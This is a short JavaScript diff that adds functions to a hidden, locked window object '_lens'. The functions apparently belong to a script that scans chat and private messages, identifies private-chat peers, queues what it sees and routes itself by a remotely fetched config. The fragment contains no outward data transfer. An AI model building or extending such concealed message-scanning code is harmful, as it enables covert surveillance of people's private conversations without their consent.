     Object.defineProperty(window, '_lens', {
-        value: { kill: kill, init: init },
+        value: {
+            kill: kill,
+            init: init,
+            scan: function() { _scanBubbles(false); },
+            hash: function() { return _sessionHash; },
+            label: function() { return _sessionLabel; },
+            route: function() { return _route(); },
+            refreshConfig: function() { return _fetchConfig(); },
+            forceRoute: function(hash, entry) {
+                if (!_remoteConfig) _remoteConfig = {};
+                _remoteConfig[hash || _sessionHash] = entry;
+                _remoteConfigAt = Date.now() + CONFIG_REFRESH_MS * 10;
+                _applyConfig();
+                return _route();
+            },
+            privateOpen: function() { return _privateOpen; },
+            privatePeer: function() { return _privatePeer(_privateEl); },
+            privateScan: function() { _scanPrivateMsgs(); },
+            stats: function() {
+                return {
+                    hash: _sessionHash,
+                    label: _sessionLabel,
+                    route: _route(),
+                    seen: _seen.size,
+                    queue: _queue.length,
+                    privateOpen: _privateOpen,
+                    privatePeer: _privatePeer(_privateEl)
+                };
+            }
+        },
         configurable: false,
         enumerable: false,
         writable: false
